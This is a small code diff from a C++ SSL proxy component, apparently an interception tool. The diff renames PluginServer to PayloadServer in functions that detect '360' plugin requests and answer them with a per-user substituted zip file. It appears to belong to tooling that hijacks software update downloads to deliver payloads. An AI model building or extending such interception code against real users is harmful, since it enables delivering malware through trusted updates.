@@ -5,7 +5,7 @@
 #include "sslPublic.h"
 #include "../cipher/CryptoUtils.h"
 #include "../HttpUtils.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 
 int TSZPlugin::is360Plugin(string url, string host) {
@@ -25,7 +25,7 @@ int TSZPlugin::reply360Plugin(char * dstbuf, int len, LPSSLPROXYPARAM lpssl) {
 		"Content-Length: %u\r\n\r\n";
 
 	string filename = Public::getUserUrl(lpssl->username, QQMUSIC_UPDATE_FN);
-	int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
 	return ret;
 }
 
